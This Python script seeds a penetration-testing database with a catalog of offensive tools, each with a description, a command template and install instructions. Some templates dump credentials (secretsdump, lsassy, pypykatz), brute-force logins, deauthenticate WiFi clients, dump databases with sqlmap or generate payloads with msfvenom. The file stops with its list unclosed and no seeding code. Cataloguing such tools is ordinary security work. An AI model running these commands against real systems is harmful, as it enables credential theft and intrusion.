#!/usr/bin/env python3
"""
Offensive Security Tools Database Seeder
Populates 300+ tools with examples, tags, and difficulty ratings
"""

import sqlite3
from datetime import datetime

DB_FILE = "pentest.db"

# Tool categories and tools
TOOLS_DATA = [
    # RECONNAISSANCE (50+ tools)
    ("nmap", "reconnaissance", "network-scanning", "Network mapper and port scanner", "nmap {target}", "apt install nmap", "intermediate", "medium", 0, "linux", "nmap", "https://github.com/nmap/nmap", "https://nmap.org", 1),
    ("masscan", "reconnaissance", "network-scanning", "Fast mass IP port scanner", "masscan {target} -p{ports}", "apt install masscan", "intermediate", "low", 1, "linux", "masscan", "https://github.com/robertdavidgraham/masscan", None, 1),
    ("zmap", "reconnaissance", "network-scanning", "Fast single-port network scanner", "zmap -p {port} {target}", "apt install zmap", "advanced", "low", 1, "linux", "zmap", "https://github.com/zmap/zmap", "https://zmap.io", 1),
    ("rustscan", "reconnaissance", "network-scanning", "Fast port scanner in Rust", "rustscan -a {target}", "cargo install rustscan", "beginner", "medium", 0, "linux", None, "https://github.com/RustScan/RustScan", None, 0),
    ("unicornscan", "reconnaissance", "network-scanning", "Distributed port scanner", "unicornscan {target}:{ports}", "apt install unicornscan", "advanced", "low", 1, "linux", "unicornscan", None, None, 1),
    
    ("dnsenum", "reconnaissance", "dns", "DNS enumeration tool", "dnsenum {domain}", "apt install dnsenum", "beginner", "high", 0, "linux", "dnsenum", None, None, 1),
    ("dnsrecon", "reconnaissance", "dns", "DNS reconnaissance tool", "dnsrecon -d {domain}", "apt install dnsrecon", "beginner", "high", 0, "linux", "dnsrecon", None, None, 1),
    ("fierce", "reconnaissance", "dns", "DNS reconnaissance and subdomain enumeration", "fierce --domain {domain}", "apt install fierce", "beginner", "high", 0, "linux", "fierce", None, None, 1),
    ("amass", "reconnaissance", "dns", "In-depth attack surface mapping", "amass enum -d {domain}", "apt install amass", "intermediate", "high", 0, "linux", "amass", "https://github.com/owasp-amass/amass", None, 1),
    ("subfinder", "reconnaissance", "dns", "Passive subdomain discovery", "subfinder -d {domain}", "go install github.com/projectdiscovery/subfinder", "beginner", "high", 0, "linux", None, "https://github.com/projectdiscovery/subfinder", None, 0),
    ("assetfinder", "reconnaissance", "dns", "Find domains and subdomains", "assetfinder {domain}", "go install github.com/tomnomnom/assetfinder", "beginner", "high", 0, "linux", None, "https://github.com/tomnomnom/assetfinder", None, 0),
    ("sublist3r", "reconnaissance", "dns", "Fast subdomains enumeration", "sublist3r -d {domain}", "apt install sublist3r", "beginner", "high", 0, "linux", "sublist3r", None, None, 1),
    ("knockpy", "reconnaissance", "dns", "Subdomain scan with wordlist", "knockpy {domain}", "pip3 install knockpy", "beginner", "high", 0, "linux", None, "https://github.com/guelfoweb/knock", None, 0),
    
    ("theHarvester", "reconnaissance", "osint", "OSINT gathering tool", "theHarvester -d {domain} -b all", "apt install theharvester", "beginner", "high", 0, "linux", "theharvester", None, None, 1),
    ("recon-ng", "reconnaissance", "osint", "Web reconnaissance framework", "recon-ng", "apt install recon-ng", "intermediate", "high", 0, "linux", "recon-ng", None, None, 1),
    ("maltego", "reconnaissance", "osint", "Interactive data mining tool", "maltego", "apt install maltego", "intermediate", "high", 0, "linux", "maltego", None, "https://www.maltego.com", 1),
    ("spiderfoot", "reconnaissance", "osint", "Automated OSINT collection", "spiderfoot -s {target}", "apt install spiderfoot", "beginner", "high", 0, "linux", "spiderfoot", None, None, 1),
    ("sherlock", "reconnaissance", "osint", "Hunt usernames across platforms", "sherlock {username}", "pip3 install sherlock-project", "beginner", "high", 0, "linux", None, "https://github.com/sherlock-project/sherlock", None, 0),
    ("ghunt", "reconnaissance", "osint", "Google account OSINT", "ghunt email {email}", "pip3 install ghunt", "intermediate", "high", 0, "linux", None, "https://github.com/mxrch/GHunt", None, 0),
    ("phoneinfoga", "reconnaissance", "osint", "Phone number OSINT", "phoneinfoga scan -n {number}", "go install github.com/sundowndev/phoneinfoga", "beginner", "high", 0, "linux", None, "https://github.com/sundowndev/phoneinfoga", None, 0),
    
    ("shodan", "reconnaissance", "search-engines", "IoT search engine CLI", "shodan search {query}", "pip3 install shodan", "beginner", "high", 0, "linux", None, None, "https://shodan.io", 0),
    ("censys-cli", "reconnaissance", "search-engines", "Censys search CLI", "censys search {query}", "pip3 install censys", "beginner", "high", 0, "linux", None, None, "https://censys.io", 0),
    
    ("whois", "reconnaissance", "domain-intel", "WHOIS lookup utility", "whois {domain}", "apt install whois", "beginner", "high", 0, "linux", "whois", None, None, 1),
    ("dmitry", "reconnaissance", "domain-intel", "DeepMagic information gathering", "dmitry -winsepo {output} {domain}", "apt install dmitry", "beginner", "high", 0, "linux", "dmitry", None, None, 1),
    
    ("wafw00f", "reconnaissance", "web", "Web application firewall detection", "wafw00f {url}", "apt install wafw00f", "beginner", "high", 0, "linux", "wafw00f", None, None, 1),
    ("whatweb", "reconnaissance", "web", "Web technology identifier", "whatweb {url}", "apt install whatweb", "beginner", "high", 0, "linux", "whatweb", None, None, 1),
    ("wappalyzer", "reconnaissance", "web", "Technology profiler (browser ext)", None, "Browser extension", "beginner", "high", 0, "cross-platform", None, None, "https://www.wappalyzer.com", 0),
    ("builtwith", "reconnaissance", "web", "Website technology lookup", None, "Online service", "beginner", "high", 0, "web", None, None, "https://builtwith.com", 0),
    ("webanalyze", "reconnaissance", "web", "Web technology detection", "webanalyze -host {url}", "go install github.com/rverton/webanalyze", "beginner", "high", 0, "linux", None, "https://github.com/rverton/webanalyze", None, 0),
    
    ("gobuster", "reconnaissance", "web-fuzzing", "URI and DNS bruteforcer", "gobuster dir -u {url} -w {wordlist}", "apt install gobuster", "beginner", "medium", 0, "linux", "gobuster", None, None, 1),
    ("dirb", "reconnaissance", "web-fuzzing", "Web content scanner", "dirb {url} {wordlist}", "apt install dirb", "beginner", "medium", 0, "linux", "dirb", None, None, 1),
    ("dirbuster", "reconnaissance", "web-fuzzing", "Multi-threaded dir/file brute-forcer", "dirbuster", "apt install dirbuster", "beginner", "medium", 0, "linux", "dirbuster", None, None, 1),
    ("ffuf", "reconnaissance", "web-fuzzing", "Fast web fuzzer", "ffuf -u {url}/FUZZ -w {wordlist}", "apt install ffuf", "intermediate", "medium", 0, "linux", "ffuf", "https://github.com/ffuf/ffuf", None, 1),
    ("feroxbuster", "reconnaissance", "web-fuzzing", "Fast recursive content discovery", "feroxbuster -u {url}", "cargo install feroxbuster", "beginner", "medium", 0, "linux", None, "https://github.com/epi052/feroxbuster", None, 0),
    ("wfuzz", "reconnaissance", "web-fuzzing", "Web application fuzzer", "wfuzz -w {wordlist} {url}/FUZZ", "apt install wfuzz", "intermediate", "medium", 0, "linux", "wfuzz", None, None, 1),
    
    ("nikto", "reconnaissance", "web-vuln-scan", "Web server scanner", "nikto -h {url}", "apt install nikto", "beginner", "medium", 0, "linux", "nikto", None, None, 1),
    ("nuclei", "reconnaissance", "web-vuln-scan", "Fast vulnerability scanner", "nuclei -u {url}", "go install github.com/projectdiscovery/nuclei", "intermediate", "medium", 0, "linux", None, "https://github.com/projectdiscovery/nuclei", None, 0),
    ("httpx", "reconnaissance", "web-vuln-scan", "Fast HTTP toolkit", "httpx -l {targets}", "go install github.com/projectdiscovery/httpx", "beginner", "high", 0, "linux", None, "https://github.com/projectdiscovery/httpx", None, 0),
    
    ("enum4linux", "reconnaissance", "smb", "SMB enumeration tool", "enum4linux {target}", "apt install enum4linux", "beginner", "high", 0, "linux", "enum4linux", None, None, 1),
    ("enum4linux-ng", "reconnaissance", "smb", "Next-gen enum4linux", "enum4linux-ng {target}", "pip3 install enum4linux-ng", "beginner", "high", 0, "linux", None, "https://github.com/cddmp/enum4linux-ng", None, 0),
    ("smbmap", "reconnaissance", "smb", "SMB share enumeration", "smbmap -H {target}", "apt install smbmap", "beginner", "high", 0, "linux", "smbmap", None, None, 1),
    ("smbclient", "reconnaissance", "smb", "SMB/CIFS client", "smbclient -L //{target}", "apt install smbclient", "beginner", "high", 0, "linux", "smbclient", None, None, 1),
    ("crackmapexec", "reconnaissance", "smb", "Swiss army knife for pentesting networks", "crackmapexec smb {target}", "apt install crackmapexec", "intermediate", "medium", 0, "linux", "crackmapexec", "https://github.com/byt3bl33d3r/CrackMapExec", None, 1),
    
    ("snmpwalk", "reconnaissance", "snmp", "SNMP enumeration", "snmpwalk -v2c -c public {target}", "apt install snmp", "beginner", "high", 0, "linux", "snmp", None, None, 1),
    ("onesixtyone", "reconnaissance", "snmp", "SNMP scanner", "onesixtyone {target}", "apt install onesixtyone", "beginner", "high", 0, "linux", "onesixtyone", None, None, 1),
    
    ("ldapsearch", "reconnaissance", "ldap", "LDAP query tool", "ldapsearch -x -H ldap://{target}", "apt install ldap-utils", "intermediate", "high", 0, "linux", "ldap-utils", None, None, 1),
    ("ldapdomaindump", "reconnaissance", "ldap", "AD information dumper", "ldapdomaindump {target} -u {user} -p {pass}", "pip3 install ldapdomaindump", "intermediate", "medium", 0, "linux", None, None, None, 0),
    
    # VULNERABILITY ANALYSIS (40+ tools)
    ("nessus", "vulnerability-analysis", "scanner", "Commercial vuln scanner", None, "Commercial", "intermediate", "medium", 0, "linux", None, None, "https://www.tenable.com/products/nessus", 0),
    ("openvas", "vulnerability-analysis", "scanner", "Open-source vuln scanner", "openvas", "apt install openvas", "advanced", "medium", 1, "linux", "openvas", None, None, 1),
    ("nexpose", "vulnerability-analysis", "scanner", "Rapid7 vuln scanner", None, "Commercial", "intermediate", "medium", 0, "linux", None, None, "https://www.rapid7.com", 0),
    
    ("searchsploit", "vulnerability-analysis", "exploit-db", "Exploit database search", "searchsploit {term}", "apt install exploitdb", "beginner", "high", 0, "linux", "exploitdb", None, None, 1),
    ("msfconsole", "vulnerability-analysis", "framework", "Metasploit Framework", "msfconsole", "apt install metasploit-framework", "intermediate", "low", 0, "linux", "metasploit-framework", "https://github.com/rapid7/metasploit-framework", None, 1),
    
    ("sqlmap", "vulnerability-analysis", "web", "SQL injection tool", "sqlmap -u {url}", "apt install sqlmap", "intermediate", "medium", 0, "linux", "sqlmap", None, None, 1),
    ("xsser", "vulnerability-analysis", "web", "XSS testing framework", "xsser --url {url}", "apt install xsser", "intermediate", "medium", 0, "linux", "xsser", None, None, 1),
    ("commix", "vulnerability-analysis", "web", "Command injection exploiter", "commix --url {url}", "apt install commix", "intermediate", "medium", 0, "linux", "commix", None, None, 1),
    ("burpsuite", "vulnerability-analysis", "web", "Web security testing", "burpsuite", "apt install burpsuite", "intermediate", "high", 0, "linux", "burpsuite", None, "https://portswigger.net", 1),
    ("zaproxy", "vulnerability-analysis", "web", "OWASP ZAP web app scanner", "zaproxy", "apt install zaproxy", "beginner", "high", 0, "linux", "zaproxy", None, "https://www.zaproxy.org", 1),
    ("wpscan", "vulnerability-analysis", "web", "WordPress security scanner", "wpscan --url {url}", "apt install wpscan", "beginner", "high", 0, "linux", "wpscan", None, None, 1),
    ("joomscan", "vulnerability-analysis", "web", "Joomla vulnerability scanner", "joomscan -u {url}", "apt install joomscan", "beginner", "high", 0, "linux", "joomscan", None, None, 1),
    ("droopescan", "vulnerability-analysis", "web", "Drupal scanner", "droopescan scan drupal -u {url}", "pip3 install droopescan", "beginner", "high", 0, "linux", None, None, None, 0),
    
    ("lynis", "vulnerability-analysis", "system", "Security auditing tool", "lynis audit system", "apt install lynis", "beginner", "high", 1, "linux", "lynis", "https://github.com/CISOfy/lynis", None, 1),
    ("chkrootkit", "vulnerability-analysis", "system", "Rootkit checker", "chkrootkit", "apt install chkrootkit", "beginner", "high", 1, "linux", "chkrootkit", None, None, 1),
    ("rkhunter", "vulnerability-analysis", "system", "Rootkit hunter", "rkhunter --check", "apt install rkhunter", "beginner", "high", 1, "linux", "rkhunter", None, None, 1),
    
    ("yara", "vulnerability-analysis", "malware", "Pattern matching tool", "yara {rule} {target}", "apt install yara", "advanced", "high", 0, "linux", "yara", "https://github.com/VirusTotal/yara", None, 1),
    ("clamav", "vulnerability-analysis", "malware", "Antivirus engine", "clamscan {target}", "apt install clamav", "beginner", "high", 0, "linux", "clamav", None, None, 1),
    
    ("sslyze", "vulnerability-analysis", "ssl", "SSL/TLS scanner", "sslyze {target}", "pip3 install sslyze", "intermediate", "high", 0, "linux", None, None, None, 0),
    ("testssl", "vulnerability-analysis", "ssl", "SSL/TLS testing tool", "testssl.sh {target}", "git clone", "beginner", "high", 0, "linux", None, "https://github.com/drwetter/testssl.sh", None, 0),
    ("sslscan", "vulnerability-analysis", "ssl", "SSL/TLS configuration scanner", "sslscan {target}", "apt install sslscan", "beginner", "high", 0, "linux", "sslscan", None, None, 1),
    
    ("davtest", "vulnerability-analysis", "webdav", "WebDAV testing tool", "davtest -url {url}", "apt install davtest", "beginner", "medium", 0, "linux", "davtest", None, None, 1),
    ("cadaver", "vulnerability-analysis", "webdav", "WebDAV client", "cadaver {url}", "apt install cadaver", "beginner", "high", 0, "linux", "cadaver", None, None, 1),
    
    # WEB APPLICATIONS (30+ tools)
    ("gospider", "web-applications", "crawler", "Fast web spider", "gospider -s {url}", "go install github.com/jaeles-project/gospider", "beginner", "high", 0, "linux", None, "https://github.com/jaeles-project/gospider", None, 0),
    ("hakrawler", "web-applications", "crawler", "Web crawler for OSINT", "hakrawler -url {url}", "go install github.com/hakluke/hakrawler", "beginner", "high", 0, "linux", None, "https://github.com/hakluke/hakrawler", None, 0),
    ("katana", "web-applications", "crawler", "Next-gen crawling framework", "katana -u {url}", "go install github.com/projectdiscovery/katana", "beginner", "high", 0, "linux", None, "https://github.com/projectdiscovery/katana", None, 0),
    
    ("arjun", "web-applications", "parameter-discovery", "HTTP parameter discovery", "arjun -u {url}", "pip3 install arjun", "beginner", "high", 0, "linux", None, "https://github.com/s0md3v/Arjun", None, 0),
    ("paramspider", "web-applications", "parameter-discovery", "Parameter miner", "paramspider -d {domain}", "pip3 install paramspider", "beginner", "high", 0, "linux", None, None, None, 0),
    
    ("jwt_tool", "web-applications", "jwt", "JWT security testing", "jwt_tool {token}", "pip3 install pyjwt", "intermediate", "high", 0, "linux", None, "https://github.com/ticarpi/jwt_tool", None, 0),
    
    ("nosqlmap", "web-applications", "nosql", "NoSQL injection tool", "nosqlmap -u {url}", "git clone", "intermediate", "medium", 0, "linux", None, "https://github.com/codingo/NoSQLMap", None, 0),
    
    ("corsy", "web-applications", "cors", "CORS misconfiguration scanner", "corsy -u {url}", "pip3 install corsy", "beginner", "high", 0, "linux", None, "https://github.com/s0md3v/Corsy", None, 0),
    
    ("ssrf-sheriff", "web-applications", "ssrf", "SSRF testing tool", None, "git clone", "intermediate", "medium", 0, "linux", None, "https://github.com/teknogeek/ssrf-sheriff", None, 0),
    
    ("xsstrike", "web-applications", "xss", "Advanced XSS scanner", "xsstrike -u {url}", "git clone", "intermediate", "medium", 0, "linux", None, "https://github.com/s0md3v/XSStrike", None, 0),
    ("dalfox", "web-applications", "xss", "Fast XSS scanner", "dalfox url {url}", "go install github.com/hahwul/dalfox", "beginner", "medium", 0, "linux", None, "https://github.com/hahwul/dalfox", None, 0),
    
    ("graphqlmap", "web-applications", "graphql", "GraphQL exploitation tool", None, "git clone", "intermediate", "medium", 0, "linux", None, "https://github.com/swisskyrepo/GraphQLmap", None, 0),
    
    ("waybackurls", "web-applications", "archive", "Fetch archived URLs", "waybackurls {domain}", "go install github.com/tomnomnom/waybackurls", "beginner", "high", 0, "linux", None, "https://github.com/tomnomnom/waybackurls", None, 0),
    ("gau", "web-applications", "archive", "Get all URLs", "gau {domain}", "go install github.com/lc/gau", "beginner", "high", 0, "linux", None, "https://github.com/lc/gau", None, 0),
    
    ("aquatone", "web-applications", "screenshot", "Website screenshotting tool", "aquatone -out {dir}", "go get", "beginner", "high", 0, "linux", None, "https://github.com/michenriksen/aquatone", None, 0),
    ("eyewitness", "web-applications", "screenshot", "Web screenshot tool", "eyewitness -f {urls} --web", "apt install eyewitness", "beginner", "high", 0, "linux", "eyewitness", None, None, 1),
    
    # DATABASE TOOLS (15+ tools)
    ("sqlmap", "database", "exploitation", "SQL injection exploitation", "sqlmap -u {url} --dbs", "apt install sqlmap", "intermediate", "medium", 0, "linux", "sqlmap", None, None, 1),
    ("mysqlmap", "database", "exploitation", "MySQL injection tool", None, "Custom", "advanced", "low", 0, "linux", None, None, None, 0),
    
    ("mongodb-tools", "database", "client", "MongoDB CLI tools", "mongo {host}", "apt install mongodb-clients", "beginner", "high", 0, "linux", "mongodb-clients", None, None, 1),
    ("redis-cli", "database", "client", "Redis command-line client", "redis-cli -h {host}", "apt install redis-tools", "beginner", "high", 0, "linux", "redis-tools", None, None, 1),
    ("psql", "database", "client", "PostgreSQL client", "psql -h {host} -U {user}", "apt install postgresql-client", "beginner", "high", 0, "linux", "postgresql-client", None, None, 1),
    ("mysql", "database", "client", "MySQL client", "mysql -h {host} -u {user} -p", "apt install mysql-client", "beginner", "high", 0, "linux", "mysql-client", None, None, 1),
    
    # PASSWORD ATTACKS (30+ tools)
    ("hashcat", "password-attacks", "cracking", "Advanced password cracking", "hashcat -m {mode} {hashfile} {wordlist}", "apt install hashcat", "intermediate", "high", 0, "linux", "hashcat", "https://github.com/hashcat/hashcat", None, 1),
    ("john", "password-attacks", "cracking", "John the Ripper password cracker", "john {hashfile}", "apt install john", "intermediate", "high", 0, "linux", "john", None, None, 1),
    ("hydra", "password-attacks", "online", "Network logon cracker", "hydra -L {users} -P {passes} {service}://{target}", "apt install hydra", "intermediate", "medium", 0, "linux", "hydra", None, None, 1),
    ("medusa", "password-attacks", "online", "Parallel login brute-forcer", "medusa -h {target} -u {user} -P {wordlist} -M {service}", "apt install medusa", "intermediate", "medium", 0, "linux", "medusa", None, None, 1),
    ("ncrack", "password-attacks", "online", "Network authentication cracker", "ncrack -p {port} {target}", "apt install ncrack", "intermediate", "medium", 0, "linux", "ncrack", None, None, 1),
    ("patator", "password-attacks", "online", "Multi-purpose brute-forcer", "patator {module} host={target}", "apt install patator", "intermediate", "medium", 0, "linux", "patator", None, None, 1),
    
    ("cewl", "password-attacks", "wordlist", "Custom wordlist generator", "cewl {url} -w {output}", "apt install cewl", "beginner", "high", 0, "linux", "cewl", None, None, 1),
    ("crunch", "password-attacks", "wordlist", "Wordlist generator", "crunch {min} {max} {charset}", "apt install crunch", "beginner", "high", 0, "linux", "crunch", None, None, 1),
    ("cupp", "password-attacks", "wordlist", "Common user passwords profiler", "cupp -i", "apt install cupp", "beginner", "high", 0, "linux", "cupp", None, None, 1),
    ("mentalist", "password-attacks", "wordlist", "Graphical wordlist generator", "mentalist", "git clone", "beginner", "high", 0, "linux", None, "https://github.com/sc0tfree/mentalist", None, 0),
    
    ("mimikatz", "password-attacks", "windows", "Windows credential dumper", None, "Windows binary", "intermediate", "low", 0, "windows", None, "https://github.com/gentilkiwi/mimikatz", None, 0),
    ("pypykatz", "password-attacks", "windows", "Mimikatz implementation in Python", "pypykatz lsa minidump {file}", "pip3 install pypykatz", "intermediate", "high", 0, "linux", None, "https://github.com/skelsec/pypykatz", None, 0),
    ("secretsdump", "password-attacks", "windows", "Impacket credential dumper", "secretsdump.py {target}", "apt install python3-impacket", "intermediate", "low", 0, "linux", "python3-impacket", None, None, 1),
    ("lsassy", "password-attacks", "windows", "Remote lsass dumper", "lsassy -d {domain} -u {user} -p {pass} {target}", "pip3 install lsassy", "intermediate", "low", 0, "linux", None, "https://github.com/Hackndo/lsassy", None, 0),
    
    ("responder", "password-attacks", "mitm", "LLMNR/NBT-NS/MDNS poisoner", "responder -I {interface}", "apt install responder", "intermediate", "low", 1, "linux", "responder", None, None, 1),
    ("inveigh", "password-attacks", "mitm", "Windows LLMNR/NBNS spoofer", None, "PowerShell script", "intermediate", "low", 0, "windows", None, "https://github.com/Kevin-Robertson/Inveigh", None, 0),
    
    ("hashid", "password-attacks", "hash-analysis", "Hash identifier", "hashid {hash}", "apt install hashid", "beginner", "high", 0, "linux", "hashid", None, None, 1),
    ("hash-identifier", "password-attacks", "hash-analysis", "Identify hash types", "hash-identifier", "apt install hash-identifier", "beginner", "high", 0, "linux", "hash-identifier", None, None, 1),
    
    # WIRELESS ATTACKS (20+ tools)
    ("aircrack-ng", "wireless", "wpa", "WiFi security testing suite", "aircrack-ng {capture}", "apt install aircrack-ng", "intermediate", "low", 1, "linux", "aircrack-ng", None, None, 1),
    ("airodump-ng", "wireless", "capture", "WiFi packet capture", "airodump-ng {interface}", "apt install aircrack-ng", "beginner", "low", 1, "linux", "aircrack-ng", None, None, 1),
    ("aireplay-ng", "wireless", "injection", "WiFi packet injection", "aireplay-ng --deauth {count} -a {bssid} {interface}", "apt install aircrack-ng", "intermediate", "low", 1, "linux", "aircrack-ng", None, None, 1),
    ("reaver", "wireless", "wps", "WPS brute-force attack tool", "reaver -i {interface} -b {bssid}", "apt install reaver", "intermediate", "low", 1, "linux", "reaver", None, None, 1),
    ("bully", "wireless", "wps", "WPS brute-force tool", "bully {interface} -b {bssid}", "apt install bully", "intermediate", "low", 1, "linux", "bully", None, None, 1),
    ("wifite", "wireless", "automation", "Automated wireless auditor", "wifite", "apt install wifite", "beginner", "low", 1, "linux", "wifite", None, None, 1),
    ("fern-wifi-cracker", "wireless", "gui", "GUI wireless security tool", "fern-wifi-cracker", "apt install fern-wifi-cracker", "beginner", "low", 1, "linux", "fern-wifi-cracker", None, None, 1),
    ("kismet", "wireless", "monitoring", "Wireless network detector", "kismet", "apt install kismet", "intermediate", "low", 1, "linux", "kismet", None, None, 1),
    ("wifiphisher", "wireless", "phishing", "WiFi phishing framework", "wifiphisher", "apt install wifiphisher", "intermediate", "low", 1, "linux", "wifiphisher", None, None, 1),
    ("fluxion", "wireless", "phishing", "WiFi evil twin attack", "fluxion", "git clone", "intermediate", "low", 1, "linux", None, "https://github.com/FluxionNetwork/fluxion", None, 0),
    ("mdk4", "wireless", "dos", "WiFi testing tool", "mdk4", "apt install mdk4", "intermediate", "low", 1, "linux", "mdk4", None, None, 1),
    ("eaphammer", "wireless", "enterprise", "WPA Enterprise attacks", "eaphammer", "git clone", "advanced", "low", 1, "linux", None, "https://github.com/s0lst1c3/eaphammer", None, 0),
    ("cowpatty", "wireless", "wpa", "WPA-PSK cracking", "cowpatty -r {capture} -f {wordlist}", "apt install cowpatty", "intermediate", "high", 0, "linux", "cowpatty", None, None, 1),
    ("pyrit", "wireless", "wpa", "GPU-accelerated WPA cracking", "pyrit", "apt install pyrit", "advanced", "high", 0, "linux", "pyrit", None, None, 1),
    
    ("hcxdumptool", "wireless", "capture", "WiFi packet capturing tool", "hcxdumptool -i {interface}", "apt install hcxdumptool", "intermediate", "low", 1, "linux", "hcxdumptool", None, None, 1),
    ("hcxtools", "wireless", "conversion", "WiFi capture conversion tools", "hcxpcapngtool -o {output} {input}", "apt install hcxtools", "intermediate", "high", 0, "linux", "hcxtools", None, None, 1),
    
    ("bluetooth", "wireless", "bluetooth", "Bluetooth tools suite", "hcitool scan", "apt install bluez", "beginner", "high", 1, "linux", "bluez", None, None, 1),
    ("ubertooth", "wireless", "bluetooth", "Bluetooth monitoring", "ubertooth-btle", "apt install ubertooth", "advanced", "low", 0, "linux", "ubertooth", None, None, 1),
    
    # EXPLOITATION (25+ tools)
    ("metasploit", "exploitation", "framework", "Exploitation framework", "msfconsole", "apt install metasploit-framework", "intermediate", "low", 0, "linux", "metasploit-framework", None, None, 1),
    ("msfvenom", "exploitation", "payload", "Payload generator", "msfvenom -p {payload} LHOST={ip} LPORT={port}", "apt install metasploit-framework", "intermediate", "low", 0, "linux", "metasploit-framework", None, None, 1),
    
    ("sqlmap", "exploitation", "web", "SQL injection automation", "sqlmap -u {url} --dump", "apt install sqlmap", "intermediate", "medium", 0, "linux", "sqlmap", None, None, 1),
    
    ("beef", "exploitation", "browser", "Browser exploitation framework", "beef-xss", "apt install beef-xss", "intermediate", "low", 0, "linux", "beef-xss", None, None, 1),
    
    ("routersploit", "exploitation", "router", "Router exploitation framework", "rsf", "pip3 install routersploit", "intermediate", "medium", 0, "linux", None, "https://github.com/threat9/routersploit", None, 0),
    
    ("social-engineer-toolkit", "exploitation", "social", "Social engineering toolkit", "setoolkit", "apt install set", "beginner", "low", 0, "linux", "set", None, None, 1),
    
    ("armitage", "exploitation", "gui", "Metasploit GUI", "armitage", "apt install armitage", "beginner", "low", 0, "linux", "armitage", None, None, 1),
    
    ("empire", "exploitation", "post-exploit", "PowerShell post-exploitation", None, "git clone", "advanced", "low", 0, "linux", None, "https://github.com/EmpireProject/Empire", None, 0),
    ("powersploit", "exploitation", "powershell", "PowerShell exploitation framework", None, "git clone", "advanced", "low", 0, "windows", None, "https://github.com/PowerShellMafia/PowerSploit", None, 0),
    
    ("exploit-db", "exploitation", "database", "Exploit database", "searchsploit {term}", "apt install exploitdb", "beginner", "high", 0, "linux", "exploitdb", None, None, 1),
    
    ("commix", "exploitation", "web", "Command injection exploitation", "commix --url {url}", "apt install commix", "intermediate", "medium", 0, "linux", "commix", None, None, 1),
    
    ("yersinia", "exploitation", "layer2", "Layer 2 attacks", "yersinia -G", "apt install yersinia", "advanced", "low", 1, "linux", "yersinia", None, None, 1),
    
    # SNIFFING & SPOOFING (20+ tools)
    ("wireshark", "sniffing", "analyzer", "Network protocol analyzer", "wireshark", "apt install wireshark", "intermediate", "high", 0, "linux", "wireshark", None, None, 1),
    ("tshark", "sniffing", "cli", "Wireshark CLI version", "tshark -i {interface}", "apt install tshark", "intermediate", "high", 0, "linux", "tshark", None, None, 1),
    ("tcpdump", "sniffing", "capture", "Packet capture tool", "tcpdump -i {interface}", "apt install tcpdump", "intermediate", "high", 1, "linux", "tcpdump", None, None, 1),
    ("tcpflow", "sniffing", "reconstruction", "TCP flow reconstruction", "tcpflow -i {interface}", "apt install tcpflow", "intermediate", "high", 0, "linux", "tcpflow", None, None, 1),
    
    ("ettercap", "sniffing", "mitm", "Network sniffer/interceptor", "ettercap -G", "apt install ettercap-graphical", "intermediate", "low", 1, "linux", "ettercap-graphical", None, None, 1),
    ("bettercap", "sniffing", "mitm", "Swiss army knife for networks", "bettercap", "apt install bettercap", "intermediate", "low", 1, "linux", "bettercap", "https://github.com/bettercap/bettercap", None, 1),
    ("mitmproxy", "sniffing", "http-proxy", "Interactive HTTPS proxy", "mitmproxy", "apt install mitmproxy", "intermediate", "medium", 0, "linux", "mitmproxy", None, None, 1),
    
    ("arpspoof", "sniffing", "arp", "ARP spoofing tool", "arpspoof -i {interface} -t {target} {gateway}", "apt install dsniff", "intermediate", "low", 1, "linux", "dsniff", None, None, 1),
    ("dsniff", "sniffing", "password", "Password sniffer", "dsniff -i {interface}", "apt install dsniff", "intermediate", "low", 1, "linux", "dsniff", None, None, 1),
    
    ("scapy", "sniffing", "packet-crafting", "Packet manipulation tool", "scapy", "apt install python3-scapy", "advanced", "medium", 0, "linux", "python3-scapy", None, None, 1),
    ("hping3", "sniffing", "packet-crafting", "Packet crafting tool", "hping3 {target}", "apt install hping3", "intermediate", "low", 1, "linux", "hping3", None, None, 1),
    
    ("netsniff-ng", "sniffing", "high-performance", "High-performance network sniffer", "netsniff-ng --in {interface}", "apt install netsniff-ng", "advanced", "high", 1, "linux", "netsniff-ng", None, None, 1),
    
    ("sslstrip", "sniffing", "ssl", "SSL stripping tool", "sslstrip -l {port}", "pip install sslstrip", "intermediate", "low", 1, "linux", None, None, None, 0),
    ("sslsplit", "sniffing", "ssl", "Transparent SSL/TLS proxy", "sslsplit", "apt install sslsplit", "advanced", "low", 1, "linux", "sslsplit", None, None, 1),
    
    # POST-EXPLOITATION (25+ tools)
    ("linenum", "post-exploitation", "linux-enum", "Linux privilege escalation checker", "./LinEnum.sh", "git clone", "beginner", "high", 0, "linux", None, "https://github.com/rebootuser/LinEnum", None, 0),
    ("linpeas", "post-exploitation", "linux-enum", "Linux privilege escalation scanner", "./linpeas.sh", "wget", "beginner", "high", 0, "linux", None, "https://github.com/carlospolop/PEASS-ng", None, 0),
    ("linux-exploit-suggester", "post-exploitation", "linux-enum", "Linux exploit suggester", "./linux-exploit-suggester.sh", "git clone", "beginner", "high", 0, "linux", None, "https://github.com/mzet-/linux-exploit-suggester", None, 0),
    ("pspy", "post-exploitation", "linux-enum", "Monitor Linux processes without root", "./pspy64", "wget", "beginner", "high", 0, "linux", None, "https://github.com/DominicBreuker/pspy", None, 0),
    
    ("winpeas", "post-exploitation", "windows-enum", "Windows privilege escalation", "winpeas.exe", "wget", "beginner", "high", 0, "windows", None, "https://github.com/carlospolop/PEASS-ng", None, 0),
    ("powerup", "post-exploitation", "windows-enum", "Windows privilege escalation", "PowerUp.ps1", "git clone", "intermediate", "high", 0, "windows", None, "https://github.com/PowerShellMafia/PowerSploit", None, 0),
    ("sherlock", "post-exploitation", "windows-enum", "Windows exploit suggester", "Sherlock.ps1", "git clone", "beginner", "high", 0, "windows", None, None, None, 0),
    ("wesng", "post-exploitation", "windows-enum", "Windows exploit suggester NG", "wes.py", "git clone", "beginner", "high", 0, "linux", None, "https://github.com/bitsadmin/wesng", None, 0),
    ("watson", "post-exploitation", "windows-enum", "Windows exploit suggester .NET", "Watson.exe", "Binary", "beginner", "high", 0, "windows", None, "https://github.com/rasta-mouse/Watson", None, 0),
    ("seatbelt", "post-exploitation", "windows-enum", "Windows security posture", "Seatbelt.exe", "Binary", "beginner", "high", 0, "windows", None, "https://github.com/GhostPack/Seatbelt", None, 0),
    
    ("bloodhound", "post-exploitation", "active-directory", "AD attack path mapper", "bloodhound", "apt install bloodhound", "intermediate", "high", 0, "linux", "bloodhound", "https://github.com/BloodHoundAD/BloodHound", None, 1),
    ("sharphound", "post-exploitation", "active-directory", "BloodHound collector", "SharpHound.exe", "Binary", "beginner", "low", 0, "windows", None, "https://github.com/BloodHoundAD/BloodHound", None, 0),
